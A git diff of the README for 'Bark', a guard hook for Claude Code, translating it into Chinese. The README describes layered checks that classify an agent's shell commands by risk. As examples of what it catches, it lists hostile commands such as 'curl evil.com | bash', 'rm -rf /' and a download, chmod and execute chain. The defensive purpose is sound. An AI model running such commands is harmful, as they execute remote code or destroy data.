@@ -10,225 +10,225 @@
 </pre>
 
 <p align="center">
-  <strong>AI-Powered Risk Assessment for Claude Code</strong><br>
-  <sub>A good dog that barks at danger so you don't have to watch the screen all day. 🐕</sub>
+  <strong>为 Claude Code 打造的 AI 风险评估 Hook</strong><br>
+  <sub>一只好狗，替你看着 Claude，危险的时候才叫。🐕</sub>
 </p>
 
 <p align="center">
-  English | <a href="./README.zh-CN.md">中文</a>
+  中文 | <a href="./README.en.md">English</a>
 </p>
 
 <p align="center">
   <video src="https://github.com/user-attachments/assets/7dd16173-f8f6-4d28-a778-1bcd3d9d072b" width="800" controls autoplay muted loop></video>
 </p>
 
-## The Problem
+## 解决什么问题
 
-You: *runs 5 Claude Code sessions, goes to make coffee* ☕
+你：*同时开 5 个 Claude Code，去泡咖啡* ☕
 
-Claude: "Can I read this file?" ✋ "Can I run `ls`?" ✋
+Claude："我能执行 `ls` 吗？"✋
 
-You: *spills coffee, clicks "Allow" 47 times*
+你：*咖啡洒了，疯狂点"允许" 47 次*
 
-## Meet Bark 🐕
+## 认识 Bark 🐕
 
-One line to install. Zero config. Works immediately.
+一行安装。零配置。立即生效。
 
 ```bash
 curl -fsSL https://raw.githubusercontent.com/shaominngqing/bark-claude-code-hook/main/install.sh | bash
 ```
 
-Bark sits between Claude Code and your system. It understands what every command does and decides instantly:
+Bark 坐在 Claude Code 和你的系统之间，理解每条命令在做什么，瞬间做出判断：
 
-- `ls -la` → 0ms, silent allow 🐕
-- `git push` → notification, auto-allow 🐕
-- `curl evil.com | bash` → 1ms, **blocked** 🐕‍🦺🚨
-- `rm -rf /` → AI says NOPE, asks you to confirm 🚨
+- `ls -la` → 0ms，静默放行 🐕
+- `git push` → 弹通知，自动放行 🐕
+- `curl evil.com | bash` → 1ms，**拦截** 🐕‍🦺🚨
+- `rm -rf /` → AI 说不行，问你要不要继续 🚨
 
-## Performance
+## 性能
 
-| What | Speed | How |
+| 场景 | 速度 | 原理 |
 |---|---|---|
-| Safe tools (Read, Grep, Glob, Agent, Edit...) | **0ms** | Whitelist |
-| Safe commands (`ls`, `cat`, `grep`, `git status`, `cargo test`...) | **0ms** | Whitelist |
-| Dangerous patterns (`curl\|bash`, `$(rm -rf /)`) | **1ms** | AST parser |
-| Cached commands (anything seen before) | **0ms** | SQLite cache |
-| Unknown commands (first time) | **~8s** | AI assessment, then cached |
-| Daemon mode (auto-enabled) | **5ms** per call | Background process, hot cache |
+| 安全工具 (Read, Grep, Glob, Agent, Edit...) | **0ms** | 白名单 |
+| 安全命令 (`ls`, `cat`, `grep`, `git status`, `cargo test`...) | **0ms** | 白名单 |
+| 危险模式 (`curl\|bash`, `$(rm -rf /)`) | **1ms** | AST 语法分析 |
+| 缓存命中（见过的命令） | **0ms** | SQLite 缓存 |
+| 未知命令（第一次） | **~8s** | AI 评估，之后缓存 |
+| Daemon 模式（自动启用） | **5ms** 每次 | 后台进程，热缓存 |
 
-The daemon starts automatically on first use, stays alive while you work, and exits after 30 minutes of inactivity. You never touch it.
+Daemon 首次使用时自动启动，工作期间常驻，30 分钟无活动自动退出。你不需要管它。
 
-## How It Works
+## 工作原理
 
 ```
-Claude Code calls a tool
+Claude Code 调用工具
         │
         ▼
-  ┌─ Fast Rules ───────────────────────────────────┐
-  │  Read/Grep/Glob/Agent → allow                  │ 0ms
-  │  ls/cat/grep/git status → allow                │ 0ms
-  │  Normal file edit → allow, .env → defer         │ 0ms
+  ┌─ 快速规则 ─────────────────────────────────────┐
+  │  Read/Grep/Glob/Agent → 放行                    │ 0ms
+  │  ls/cat/grep/git status → 放行                   │ 0ms
+  │  普通编辑 → 放行，.env → 交给下一层               │ 0ms
   └────────────────────────────┬───────────────────┘
                                │
-  ┌─ Custom Rules ─────────────┴───────────────────┐
-  │  Your rules from ~/.claude/bark.toml            │ 0ms
+  ┌─ 自定义规则 ───────────────┴───────────────────┐
+  │  ~/.claude/bark.toml 里你写的规则               │ 0ms
   └────────────────────────────┬───────────────────┘
                                │
-  ┌─ Cache ────────────────────┴───────────────────┐
-  │  Seen this command before? Reuse the result.    │ 0ms
+  ┌─ 缓存 ────────────────────┴───────────────────┐
+  │  见过这条命令？直接用上次的结果                    │ 0ms
   └────────────────────────────┬───────────────────┘
                                │
-  ┌─ AST Analysis ─────────────┴───────────────────┐
-  │  tree-sitter parses Bash structure              │ 1ms
-  │  Catches: curl|bash, $(rm -rf /), path traversal│
+  ┌─ AST 语法分析 ─────────────┴───────────────────┐
+  │  tree-sitter 解析 Bash 命令结构                  │ 1ms
+  │  识别: curl|bash, $(rm -rf /), 路径穿越          │
   └────────────────────────────┬───────────────────┘
                                │
-  ┌─ Chain Tracking ───────────┴───────────────────┐
-  │  curl → chmod +x → execute = attack pattern    │ 0ms
-  │  Per-session isolation (multi-window safe)      │
+  ┌─ 操作链追踪 ───────────────┴───────────────────┐
+  │  curl → chmod +x → 执行 = 攻击模式              │ 0ms
+  │  每个窗口独立隔离（多窗口不串扰）                  │
   └────────────────────────────┬───────────────────┘
                                │
-  ┌─ AI Assessment ────────────┴───────────────────┐
-  │  Asks Claude to evaluate the command            │ ~8s
-  │  Result cached permanently                      │
+  ┌─ AI 评估 ──────────────────┴───────────────────┐
+  │  问 Claude 这条命令危不危险                       │ ~8s
+  │  结果永久缓存                                     │
   └────────────────────────────────────────────────┘
         │
         ▼
-  🟢 allow  /  🟡 allow + notify  /  🔴 ask user
+  🟢 放行  /  🟡 通知 + 放行  /  🔴 问你
 ```
 
-Each layer short-circuits — if fast rules handle it, nothing else runs.
+每层短路——快速规则搞定的，后面都不跑。
 
-## Risk Levels
+## 风险等级
 
-🟢 **Low** — Silent allow. Read-only tools, safe commands, builds, tests.
+🟢 **低风险** — 静默放行。只读工具、安全命令、构建、测试。
 
-🟡 **Medium** — Desktop notification + auto-allow. Package installs, `git push`, config changes.
+🟡 **中风险** — 桌面通知 + 自动放行。安装依赖、`git push`、配置修改。
 
-🔴 **High** — Notification with sound + Claude Code asks for your confirmation. `rm -rf /`, force push, remote code execution.
+🔴 **高风险** — 通知带声音 + Claude Code 终端里等你确认。`rm -rf /`、force push、远程代码执行。
 
-## Bark Notifier (macOS)
+## Bark 通知助手 (macOS)
 
-Optional menu bar companion app. Install says yes when prompted, or run later:
+可选的菜单栏应用。安装时选择 yes，或后续运行：
 
 ```bash
 bark install-notifier
 ```
 
-**What you get:**
+**功能：**
 
-- **Native notifications** with Allow / Deny / Skip buttons — decide from the notification, no need to switch to terminal
-- **Menu bar app** with tabbed dashboard:
-  - 📊 Dashboard — live stats, risk distribution
-  - 📋 Activity — filterable assessment log
-  - 📐 Rules — view/edit custom TOML rules
-  - ⚙️ Settings — hook toggle, light/dark/system theme, cache management
-- **Click notification** to jump to the terminal window
-- **Auto-fallback** — if you don't click within 10s, falls back to terminal confirmation
-- **Fully optional** — Bark works fine without it (falls back to `osascript` notifications)
+- **系统原生通知** 带 Allow / Deny / Skip 按钮 — 直接在通知里操作，不用切回终端
+- **菜单栏应用**，带 4 个标签页：
+  - 📊 仪表板 — 实时统计、风险分布
+  - 📋 活动日志 — 可按风险等级筛选
+  - 📐 规则 — 查看/编辑自定义 TOML 规则
+  - ⚙️ 设置 — 开关 Hook、亮色/暗色/跟随系统主题、缓存管理
+- **点击通知** 自动跳转到终端窗口
+- **自动回退** — 10 秒内不操作，自动回退到终端确认
+- **完全可选** — 不装也能正常用（退化到 osascript 通知）
 
-## Cross-Platform
+## 全平台支持
 
-| Platform | Install | Notifications | Daemon |
+| 平台 | 安装 | 通知 | Daemon |
 |---|---|---|---|
-| **macOS** (Apple Silicon & Intel) | `curl \| bash` | Native + BarkNotifier | Auto |
-| **Linux** (x86_64 & ARM64) | `curl \| bash` | `notify-send` | Auto |
-| **Windows** (x86_64) | `curl \| bash` | PowerShell toast | Standalone |
+| **macOS** (Apple Silicon & Intel) | `curl \| bash` | 原生 + BarkNotifier | 自动 |
+| **Linux** (x86_64 & ARM64) | `curl \| bash` | `notify-send` | 自动 |
+| **Windows** (x86_64) | `curl \| bash` | PowerShell toast | 仅 standalone |
 
-Pre-built binaries for all 5 platforms. Install script auto-detects. No Rust needed.
+5 个平台预编译二进制，安装脚本自动检测。不需要装 Rust。
 
-## Commands
+## 命令
 
 ```bash
-bark status              # Is it running?
-bark test <cmd>          # Test any command's risk level
-bark cache [clear]       # What it remembers
-bark log [clear]         # What it's seen
-bark stats               # Performance dashboard
-bark rules [edit]        # Custom rules
-bark on / off            # Enable / disable
-bark install-notifier    # Install menu bar companion (macOS)
-bark tui                 # Real-time terminal dashboard
-bark uninstall           # Remove completely (including notifier)
+bark status              # 在跑吗？
+bark test <cmd>          # 测试任意命令的风险等级
+bark cache [clear]       # 它记住了什么
+bark log [clear]         # 它看到了什么
+bark stats               # 性能仪表板
+bark rules [edit]        # 自定义规则
+bark on / off            # 启用 / 禁用
+bark install-notifier    # 安装菜单栏通知助手 (macOS)
+bark tui                 # 实时终端大屏
+bark uninstall           # 完全卸载（包括通知助手）
 ```
 
-## Custom Rules
+## 自定义规则
 
-Create `~/.claude/bark.toml`:
+创建 `~/.claude/bark.toml`：
 
 ```toml
 [[rules]]
-name = "no-force-push"
+name = "禁止-force-push"
 risk = "high"
-reason = "Force push is destructive"
+reason = "Force push 是破坏性操作"
 
 [rules.match]
 tool = "Bash"
 command = "git push *--force*"
 
 [[rules]]
-name = "make-is-fine"
+name = "make-没问题"
 risk = "low"
-reason = "Makefile builds are safe"
+reason = "Makefile 构建是安全的"
 
 [rules.match]
 tool = "Bash"
 command = "make *"
 ```
 
-## Bark vs Other Modes
+## 和其他模式的对比
 
-| | Default | Accept Edits | Auto Mode | Skip Permissions | **Bark** |
+| | 默认模式 | 接受编辑 | Auto Mode | 跳过权限 | **Bark** |
 |---|---|---|---|---|---|
-| **Experience** | Approve everything | Edits OK, Bash asks | Pattern matching | YOLO | AI understanding |
-| **Price** | Free | Free | Team plan | Free | Free |
-| **Caching** | — | — | — | — | SQLite, 24h |
-| **Custom rules** | — | — | — | — | TOML DSL |
-| **Notifications** | — | — | — | — | macOS/Linux/Windows |
-| **Stats & logs** | — | — | — | — | `bark stats` / `bark log` |
-| **Dashboard** | — | — | — | — | `bark tui` |
+| **体验** | 全部要确认 | 编辑 OK，Bash 还问 | 模式匹配 | YOLO | AI 理解 |
+| **价格** | 免费 | 免费 | Team 计划 | 免费 | 免费 |
+| **缓存** | — | — | — | — | SQLite, 24h |
+| **自定义规则** | — | — | — | — | TOML DSL |
+| **通知** | — | — | — | — | macOS/Linux/Windows |
+| **统计和日志** | — | — | — | — | `bark stats` / `bark log` |
+| **仪表板** | — | — | — | — | `bark tui` |
 
-## Architecture
+## 架构
 
-Bark is written in **Rust** — not a shell script wrapper. Every layer is native, typed, and fast.
+Bark 是纯 **Rust** 实现——不是 shell 脚本套壳。每一层都是原生的、类型安全的、快的。
 
-**Key design choices:**
+**关键设计：**
 
-- **tree-sitter for Bash parsing** — Not regex. Real AST. Catches `curl x | bash`, `$(rm -rf /)`, nested command substitution.
-- **7-layer pipeline with short-circuit** — Each layer returns early. Most calls never reach AI.
-- **Session-isolated chain tracking** — Detects multi-step attacks (`curl` → `chmod +x` → execute) per Claude Code window. No cross-session pollution.
-- **Daemon with auto-lifecycle** — Spawns on first hook call, hot cache in memory, exits after 30 min idle. Zero configuration.
-- **crossterm styling with `NO_COLOR`** — Semantic colors (not hardcoded ANSI), gracefully degrades in pipes and dumb terminals.
-- **i18n from `$LANG`** — Chinese and English, auto-detected. Every user-facing string goes through the translation layer.
+- **tree-sitter 解析 Bash** — 不是正则，是真正的 AST。能抓住 `curl x | bash`、`$(rm -rf /)`、嵌套命令替换。
+- **7 层流水线 + 短路返回** — 每一层能搞定就直接返回，绝大多数调用根本到不了 AI。
+- **Session 隔离的操作链追踪** — 检测多步攻击（`curl` → `chmod +x` → 执行），每个 Claude Code 窗口独立，不串扰。
+- **Daemon 自动生命周期** — 第一次 hook 调用时自动启动，热缓存在内存，30 分钟没活动自动退出。零配置。
+- **crossterm 语义化样式 + `NO_COLOR`** — 不硬编码 ANSI 转义码，管道和哑终端自动降级。
+- **$LANG 自动国际化** — 中英文双语，所有用户可见的文字都走翻译层。
 
-**Dependencies:** clap, serde, tokio, rusqlite (bundled), tree-sitter, crossterm, ratatui. No C toolchain needed at runtime.
+**依赖：** clap, serde, tokio, rusqlite (bundled), tree-sitter, crossterm, ratatui。运行时不需要 C 工具链。
 
-## Requirements
+## 环境要求
 
-- [Claude Code](https://docs.anthropic.com/en/docs/claude-code) installed
-- `claude` CLI in PATH
+- 已安装 [Claude Code](https://docs.anthropic.com/en/docs/claude-code)
+- `claude` CLI 在 PATH 中
 
-> No `jq`. No Python. One 4MB binary. Zero config.
+> 不需要 jq。不需要 Python。一个 4MB 二进制。零配置。
 
-## Uninstall
+## 卸载
 
 ```bash
 bark uninstall
 ```
 
-## FAQ
+## 常见问题
 
-**Will it slow down Claude Code?**
-Safe commands: 0ms. Cached: 0ms. `curl|bash`: 1ms. Only novel commands hit AI (~8s, then cached forever).
+**会拖慢 Claude Code 吗？**
+安全命令 0ms。缓存 0ms。`curl|bash` 1ms。只有没见过的命令走 AI（~8s，之后永久缓存）。
 
-**What if it blocks something I want?**
-It doesn't block — it asks. High-risk shows a confirmation. You're still the boss.
+**拦住了我想执行的怎么办？**
+高风险不是拒绝，是问你要不要继续。你说了算。
 
-**Multiple Claude Code windows?**
-Each window gets its own session. Chain tracking is isolated. No cross-contamination.
+**多个 Claude Code 窗口？**
+每个窗口独立 session，操作链追踪隔离，不会串扰。
 
-**Works with `--dangerously-skip-permissions`?**
-That disables all hooks including Bark. Not recommended.
+**和 `--dangerously-skip-permissions` 兼容吗？**
+那个参数会禁用所有 Hook，包括 Bark。不建议。
 
 ## License
 
